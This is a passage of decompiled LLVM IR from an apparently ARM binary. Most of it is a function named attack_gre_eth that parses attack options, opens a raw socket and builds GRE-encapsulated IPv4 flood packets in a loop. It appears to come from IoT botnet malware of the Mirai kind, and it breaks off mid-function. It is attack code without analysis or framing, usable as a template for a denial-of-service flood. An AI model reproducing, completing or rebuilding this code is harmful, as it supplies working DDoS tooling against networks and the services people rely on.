  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 326, 15, 14, 16, 158, 327, 152, 62, 39, 337, 328, 330, 329, 331, 333, 332, 335, 334, 338, 336, 339, 341, 340, 342, 344, 343, 19, 18, 23, 20, 21, 22, 24, 25, 27, 26, 29, 28, 30, 31, 32, 34, 33, 35, 36, 37, 40, 38, 42, 41, 43, 45, 44, 46, 49, 47, 48, 51, 50, 55, 52, 53, 54, 56, 58, 57, 60, 59, 61, 64, 63, 66, 65, 67, 68, 282, 281, 283, 284, 286, 285, 288, 287, 290, 289, 291, 293, 292, 294, 295, 296, 298, 297, 300, 299, 301, 303, 302, 304, 306, 305, 308, 307, 309, 311, 310, 312, 315, 313, 314, 317, 316, 319, 318, 320, 322, 321, 323, 325, 324, 70, 69, 71, 73, 72, 75, 74, 77, 76, 79, 78, 81, 80, 84, 82, 83, 86, 85, 87, 89, 88, 90, 93, 91, 92, 95, 94, 97, 96, 98, 100, 99, 101, 103, 102, 104, 105, 106, 108, 107, 110, 109, 111, 113, 112, 114, 116, 115, 117, 118, 119, 121, 120, 123, 122, 124, 126, 125, 127, 129, 128, 130, 132, 131, 133, 134, 136, 135, 138, 137, 141, 139, 140, 144, 142, 143, 147, 145, 146, 148, 150, 149, 151, 154, 153, 156, 155, 157, 159, 160, 162, 161, 165, 163, 164, 167, 166, 168, 170, 169, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 225, 227, 228, 230, 229, 232, 231, 234, 233, 237, 236, 235, 241, 238, 239, 240, 17, 244, 242, 243, 245, 246, 247, 248, 249, 250, 0, 252, 251, 253, 254, 256, 255, 257, 258, 259, 260, 261, 262, 263, 264, 266, 265, 268, 267, 270, 269, 272, 271, 274, 273, 275, 276, 277, 278, 279, 280, 1 }
  uselistorder i32* %ip.global-to-local, { 52, 53, 0, 1, 2, 44, 45, 46, 47, 48, 49, 50, 51, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32* %fp.global-to-local, { 36, 35, 0, 2, 1, 3, 19, 20, 21, 28, 27, 31, 22, 23, 24, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 25, 26, 29, 30, 32, 34, 33 }
  uselistorder i1* %cpsr_z.global-to-local, { 148, 149, 150, 151, 152, 153, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 72, 65, 66, 67, 68, 69, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 93, 95, 94, 89, 90, 91, 92, 96, 97, 98, 99, 100, 101, 109, 110, 102, 103, 104, 105, 106, 107, 108, 111, 0, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124 }
  uselistorder i1* %cpsr_c.global-to-local, { 159, 160, 161, 162, 163, 164, 165, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 29, 30, 32, 33, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 76, 70, 71, 72, 73, 74, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 97, 99, 98, 93, 94, 95, 96, 100, 101, 102, 103, 104, 105, 106, 107, 115, 116, 108, 109, 110, 111, 112, 113, 114, 117, 0, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3f4.85 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b3e4.81 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b3dc.79 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3b0.63 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i8 7, { 3, 4, 0, 1, 2 }
  uselistorder i8 4, { 1, 0, 2 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 51, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 50, { 0, 2, 1, 3 }
  uselistorder i32 49, { 0, 2, 1, 3 }
  uselistorder i32 43, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_a550, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_a414, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a3f4, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_a1c0, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_a194, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_a0f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a024, { 5, 1, 2, 6, 3, 4, 0 }
  uselistorder label %dec_label_pc_9fd8, { 1, 0 }
  uselistorder label %dec_label_pc_9fb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fa4, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9d60, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9c5c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ba8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9b80, { 1, 0 }
  uselistorder label %dec_label_pc_9b44, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_9a58, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_978c, { 1, 0 }
  uselistorder label %dec_label_pc_9644, { 1, 0 }
  uselistorder label %dec_label_pc_9514, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_94ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9480, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_9390, { 1, 0 }
  uselistorder label %dec_label_pc_9378, { 1, 0 }
  uselistorder label %dec_label_pc_933c, { 1, 0 }
  uselistorder label %dec_label_pc_92c8, { 1, 0 }
  uselistorder label %dec_label_pc_9290, { 1, 0 }
  uselistorder label %dec_label_pc_8fc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8ef8, { 7, 8, 9, 10, 13, 5, 14, 15, 6, 16, 11, 1, 12, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_8ec0, { 1, 0 }
  uselistorder label %dec_label_pc_8d00, { 6, 0, 1, 2, 5, 3, 4, 7 }
  uselistorder label %dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8c54.dec_label_pc_8c54_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8c38, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_8c38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8bcc, { 1, 0 }
  uselistorder label %dec_label_pc_8b50, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_8a08, { 1, 0 }
  uselistorder label %dec_label_pc_89c0, { 1, 3, 4, 0, 2 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a66c = load i32, i32* @r4, align 4
  %v24_a66c = load i32, i32* @fp, align 4
  %v27_a66c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a698 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a69c = load i32, i32* @r4, align 4
  store i32 %v0_a69c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a6a8 = load i32, i32* @sb, align 4
  store i32 %v0_a6a8, i32* %r3.global-to-local, align 4
  %v0_a6ac = load i32, i32* @r5, align 4
  store i32 %v0_a6ac, i32* %r0.global-to-local, align 4
  %v5_a6b0 = inttoptr i32 %v0_a69c to i32*
  %v6_a6b0 = call i32 @attack_get_opt_int(i32 %v0_a6ac, i32* %v5_a6b0, i32 2, i32 %v0_a6a8)
  %v1_a6bc = urem i32 %v6_a6b0, 256
  store i32 %v1_a6bc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a6c8 = load i32, i32* @r4, align 4
  store i32 %v0_a6c8, i32* %r1.global-to-local, align 4
  %v0_a6cc = load i32, i32* @r5, align 4
  store i32 %v0_a6cc, i32* %r0.global-to-local, align 4
  %v5_a6d0 = trunc i32 %v6_a6b0 to i8
  %v6_a6d4 = inttoptr i32 %v0_a6c8 to i32*
  %v7_a6d4 = call i32 @attack_get_opt_int(i32 %v0_a6cc, i32* %v6_a6d4, i32 3, i32 65535)
  %v0_a6d8 = load i32, i32* @r4, align 4
  store i32 %v0_a6d8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a6d4, i32* %fp.global-to-local, align 4
  %v0_a6e8 = load i32, i32* @r5, align 4
  store i32 %v0_a6e8, i32* %r0.global-to-local, align 4
  %v4_a6ec = inttoptr i32 %v0_a6d8 to i32*
  %v5_a6ec = call i32 @attack_get_opt_int(i32 %v0_a6e8, i32* %v4_a6ec, i32 4, i32 64)
  %v1_a6f4 = urem i32 %v5_a6ec, 256
  store i32 %v1_a6f4, i32* %ip.global-to-local, align 4
  %v0_a6f8 = load i32, i32* @r4, align 4
  store i32 %v0_a6f8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a704 = load i32, i32* @r5, align 4
  store i32 %v0_a704, i32* %r0.global-to-local, align 4
  %v6_a70c = inttoptr i32 %v0_a6f8 to i32*
  %v7_a70c = call i32 @attack_get_opt_int(i32 %v0_a704, i32* %v6_a70c, i32 5, i32 1)
  %v1_a718 = urem i32 %v7_a70c, 256
  store i32 %v1_a718, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* %r1.global-to-local, align 4
  %v0_a728 = load i32, i32* @r5, align 4
  store i32 %v0_a728, i32* %r0.global-to-local, align 4
  %v5_a730 = inttoptr i32 %v0_a724 to i32*
  %v6_a730 = call i32 @attack_get_opt_int(i32 %v0_a728, i32* %v5_a730, i32 6, i32 65535)
  %v0_a73c = load i32, i32* @r4, align 4
  store i32 %v0_a73c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a748 = load i32, i32* @r5, align 4
  store i32 %v0_a748, i32* %r0.global-to-local, align 4
  %v5_a74c = inttoptr i32 %v0_a73c to i32*
  %v6_a74c = call i32 @attack_get_opt_int(i32 %v0_a748, i32* %v5_a74c, i32 7, i32 65535)
  %v0_a750 = load i32, i32* @r4, align 4
  store i32 %v0_a750, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* @sb, align 4
  store i32 %v0_a754, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_a74c, i32* @r8, align 4
  %v0_a760 = load i32, i32* @r5, align 4
  store i32 %v0_a760, i32* %r0.global-to-local, align 4
  %v4_a764 = inttoptr i32 %v0_a750 to i32*
  %v5_a764 = call i32 @attack_get_opt_int(i32 %v0_a760, i32* %v4_a764, i32 %v0_a754, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a774 = load i32, i32* @r4, align 4
  store i32 %v0_a774, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* @r5, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  %v4_a77c = inttoptr i32 %v0_a774 to i32*
  %v5_a77c = call i32 @attack_get_opt_int(i32 %v0_a778, i32* %v4_a77c, i32 1, i32 1)
  %v1_a784 = urem i32 %v5_a77c, 256
  store i32 %v1_a784, i32* %ip.global-to-local, align 4
  %v0_a788 = load i32, i32* @r4, align 4
  store i32 %v0_a788, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a790 = load i32, i32* @sb, align 4
  store i32 %v0_a790, i32* %r3.global-to-local, align 4
  %v0_a794 = load i32, i32* @r5, align 4
  store i32 %v0_a794, i32* %r0.global-to-local, align 4
  %v5_a79c = inttoptr i32 %v0_a788 to i32*
  %v6_a79c = call i32 @attack_get_opt_int(i32 %v0_a794, i32* %v5_a79c, i32 18, i32 %v0_a790)
  %v0_a7a4 = load i32, i32* @r4, align 4
  store i32 %v0_a7a4, i32* %r1.global-to-local, align 4
  %v2_a7a8 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_a7a8, i32* %r3.global-to-local, align 4
  store i32 %v6_a79c, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  store i32 %v0_a7b4, i32* %r0.global-to-local, align 4
  %v4_a7b8 = inttoptr i32 %v0_a7a4 to i32*
  %v5_a7b8 = call i32 @attack_get_opt_int(i32 %v0_a7b4, i32* %v4_a7b8, i32 24, i32 %v2_a7a8)
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v1_a7c4 = inttoptr i32 %v0_a7c0 to i32*
  %v2_a7c4 = call i32 @__GI_time(i32* %v1_a7c4)
  %v1_a7c8 = load i32, i32* @r6, align 4
  %v2_a7c8 = add i32 %v1_a7c8, %v2_a7c4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a7dc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v7_a7e0 = icmp eq i32 %v3_a7dc, -1
  store i1 %v7_a7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a7e0, label %dec_label_pc_ad18, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a7f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a7f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @sb, align 4
  store i32 %v0_a7fc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a808 = call i32 @__GI_setsockopt(i32 %v3_a7dc, i32 %v0_a7fc, i32 3, i32 %v6_a7f4, i32 4)
  store i32 %v5_a808, i32* %r0.global-to-local, align 4
  %v7_a80c = icmp eq i32 %v5_a808, -1
  store i1 %v7_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a80c, label %dec_label_pc_ad24, label %dec_label_pc_a814

dec_label_pc_a814:                                ; preds = %dec_label_pc_a7ec
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_a81c = mul i32 %v6_a730, 65536
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v0_a820 = load i32, i32* @r8, align 4
  %v0_a824 = load i32, i32* %fp.global-to-local, align 4
  %v3_a824 = mul i32 %v0_a824, 65536
  store i32 %v3_a824, i32* %fp.global-to-local, align 4
  %v0_a828 = load i32, i32* @r7, align 4
  %v1_a828 = urem i32 %v0_a828, 256
  store i32 %v1_a828, i32* @r7, align 4
  %v3_a82c = urem i32 %v0_a824, 65536
  store i32 %v3_a82c, i32* %r3.global-to-local, align 4
  %v3_a830 = urem i32 %v6_a730, 65536
  store i32 %v3_a830, i32* %ip.global-to-local, align 4
  %v3_a834 = urem i32 %v0_a820, 65536
  %v2_a838 = icmp eq i32 %arg2, 0
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  %v0_a848 = load i32, i32* @sb, align 4
  store i32 %v0_a848, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_aa50.preheader, label %dec_label_pc_a85c

dec_label_pc_a85c:                                ; preds = %dec_label_pc_a814
  %v3_a820 = mul i32 %v0_a820, 65536
  %v3_a860 = mul i32 %v5_a764, 65536
  %v1_a864 = add i32 %v3_a860, 4325376
  %v0_a824.not = or i32 %v0_a824, -65536
  %v1_a868 = xor i32 %v0_a824.not, 65535
  %v3_a874 = mul i32 %v1_a868, 65536
  store i32 %v3_a874, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_a864, 256
  %v3_a88c = and i32 %tmp68, 65280
  store i32 %v3_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v3_a860, 524288
  %tmp69 = mul i32 %v0_a824, 256
  %v3_a894 = and i32 %tmp69, 65280
  %v1_a898 = add i32 %v3_a860, 1835008
  %tmp70 = mul nsw i32 %v1_a868, 256
  %v3_a89c = and i32 %tmp70, 65280
  %v4_a8a0 = udiv i32 %v1_a864, 16777216
  %v5_a8a0 = or i32 %v4_a8a0, %tmp68
  %v3_a8a8 = udiv i32 %v1_a898, 256
  %v5_a8ac = trunc i32 %v5_a8a0 to i16
  %tmp71 = udiv i32 %v0_a824, 256
  %v4_a8b0 = urem i32 %tmp71, 256
  %v5_a8b0 = or i32 %v4_a8b0, %v3_a894
  store i32 %v5_a8b0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_a868, 256
  %v4_a8b4 = urem i32 %tmp72, 256
  %v5_a8b4 = or i32 %v4_a8b4, %v3_a89c
  store i32 %v5_a8b4, i32* @fp, align 4
  store i32 %v3_a820, i32* %r2.global-to-local, align 4
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v1_a8c0 = and i32 %v3_a8a8, 65280
  %tmp73 = mul i32 %v6_a730, 256
  %v3_a8c4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_a820, 256
  %v3_a8c8 = and i32 %tmp74, 65280
  %v4_a8d0 = udiv i32 %v1_a898, 16777216
  %v5_a8d0 = or i32 %v1_a8c0, %v4_a8d0
  store i32 %v5_a8d0, i32* @r5, align 4
  %tmp75 = udiv i32 %v6_a730, 256
  %v4_a8d4 = urem i32 %tmp75, 256
  %v5_a8d4 = or i32 %v4_a8d4, %v3_a8c4
  store i32 %v5_a8d4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_a820, 256
  %v4_a8d8 = urem i32 %tmp76, 256
  %v5_a8d8 = or i32 %v4_a8d8, %v3_a8c8
  store i32 %v5_a8d8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_a890, 256
  %v3_a8dc = and i32 %tmp77, 65280
  store i32 %v3_a8dc, i32* @lr, align 4
  %v5_a8e8 = trunc i32 %v5_a8d0 to i16
  %v4_a8ec = udiv i32 %v1_a890, 16777216
  %v5_a8ec = or i32 %v3_a8dc, %v4_a8ec
  store i32 %v5_a8ec, i32* @r8, align 4
  store i32 %v0_a848, i32* @r4, align 4
  %v4_a948 = sext i8 %v5_a6d0 to i32
  %v1_a954 = trunc i32 %v5_a6ec to i8
  %v2_aa08 = icmp eq i32 %v1_a828, 0
  %sext = mul nuw i32 %v5_a8d4, 65536
  %v4_aa2c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_a8d8, 65536
  %v4_aa34 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %bb80, %dec_label_pc_a85c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a900 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_a900, i32* %r0.global-to-local, align 4
  %v3_a908 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a908, i32* %r2.global-to-local, align 4
  %v2_a90c = load i32, i32* @r4, align 4
  %v5_a90c = mul i32 %v2_a90c, 4
  %v6_a90c = add i32 %v5_a90c, %v2_a698
  %v7_a90c = inttoptr i32 %v6_a90c to i32*
  store i32 %v2_a900, i32* %v7_a90c, align 4
  store i32 %v2_a698, i32* %r1.global-to-local, align 4
  %v0_a914 = load i32, i32* %r2.global-to-local, align 4
  %v3_a914 = mul i32 %v0_a914, 32
  store i32 %v3_a914, i32* %r3.global-to-local, align 4
  %v4_a918 = mul i32 %v0_a914, 4
  %v5_a918 = add i32 %v4_a918, %v2_a698
  %v6_a918 = inttoptr i32 %v5_a918 to i32*
  %v7_a918 = load i32, i32* %v6_a918, align 4
  store i32 %v7_a918, i32* %r4.global-to-local, align 4
  %v5_a91c = mul i32 %v0_a914, 24
  store i32 %v5_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = load i32, i32* @sl, align 4
  %v2_a920 = add i32 %v1_a920, %v5_a91c
  store i32 %v2_a920, i32* %lr.global-to-local, align 4
  %v1_a924 = inttoptr i32 %v7_a918 to i8*
  %v2_a924 = load i8, i8* %v1_a924, align 1
  %tmp = urem i8 %v2_a924, 16
  %v1_a928 = zext i8 %tmp to i32
  %v1_a92c = or i32 %v1_a928, 64
  store i32 %v1_a92c, i32* %r3.global-to-local, align 4
  %v1_a930 = trunc i32 %v1_a92c to i8
  store i8 %v1_a930, i8* %v1_a924, align 1
  %v0_a934 = load i32, i32* %r4.global-to-local, align 4
  %v1_a934 = inttoptr i32 %v0_a934 to i8*
  %v2_a934 = load i8, i8* %v1_a934, align 1
  %v1_a938 = and i8 %v2_a934, -16
  %v1_a93c = or i8 %v1_a938, 5
  store i32 %v1_a718, i32* %r3.global-to-local, align 4
  store i8 %v1_a93c, i8* %v1_a934, align 1
  store i32 %v4_a948, i32* %r1.global-to-local, align 4
  %v2_a94c = load i32, i32* %r4.global-to-local, align 4
  %v3_a94c = add i32 %v2_a94c, 1
  %v4_a94c = inttoptr i32 %v3_a94c to i8*
  store i8 %v5_a6d0, i8* %v4_a94c, align 1
  store i32 %v1_a6f4, i32* %r2.global-to-local, align 4
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 8
  %v4_a954 = inttoptr i32 %v3_a954 to i8*
  store i8 %v1_a954, i8* %v4_a954, align 1
  %v0_a958 = load i32, i32* %r3.global-to-local, align 4
  %v2_a958 = icmp eq i32 %v0_a958, 0
  store i1 %v2_a958, i1* %cpsr_z.global-to-local, align 1
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 2
  %v4_a960 = inttoptr i32 %v3_a960 to i16*
  store i16 %v5_a8ac, i16* %v4_a960, align 2
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 9
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 47, i8* %v4_a968, align 1
  store i32 %v5_a7b8, i32* %r3.global-to-local, align 4
  %v1_a970 = load i32, i32* %r4.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 12
  %v3_a970 = inttoptr i32 %v2_a970 to i32*
  store i32 %v5_a7b8, i32* %v3_a970, align 4
  %v0_a974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a974, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a8f4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a978 = load i32, i32* %r4.global-to-local, align 4
  %v4_a978 = add i32 %v3_a978, 6
  %v5_a978 = inttoptr i32 %v4_a978 to i16*
  store i16 64, i16* %v5_a978, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a8f4, %bb
  %v0_a97c = load i32, i32* %lr.global-to-local, align 4
  %v1_a97c = add i32 %v0_a97c, 16
  %v2_a97c = inttoptr i32 %v1_a97c to i32*
  %v3_a97c = load i32, i32* %v2_a97c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_a984 = load i32, i32* %r4.global-to-local, align 4
  %v2_a984 = add i32 %v1_a984, 16
  %v3_a984 = inttoptr i32 %v2_a984 to i32*
  store i32 %v3_a97c, i32* %v3_a984, align 4
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a988 = add i32 %v0_a988, 24
  store i32 %v1_a988, i32* %r0.global-to-local, align 4
  %v1_a98c = add i32 %v0_a988, 20
  store i32 %v1_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* %ip.global-to-local, align 4
  %v1_a990 = add i32 %v0_a990, 101
  store i32 %v1_a990, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_a99c = load i32, i32* @r7, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v3_a99c = add i32 %v0_a988, 4
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a9a0 = trunc i32 %v0_a9a0 to i16
  %v2_a9a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a9a0 = add i32 %v2_a9a0, 2
  %v4_a9a0 = inttoptr i32 %v3_a9a0 to i16*
  store i16 %v1_a9a0, i16* %v4_a9a0, align 2
  %v0_a9a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9a4 = trunc i32 %v0_a9a4 to i8
  %v2_a9a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a4 = add i32 %v2_a9a4, 13
  %v4_a9a4 = inttoptr i32 %v3_a9a4 to i8*
  store i8 %v1_a9a4, i8* %v4_a9a4, align 1
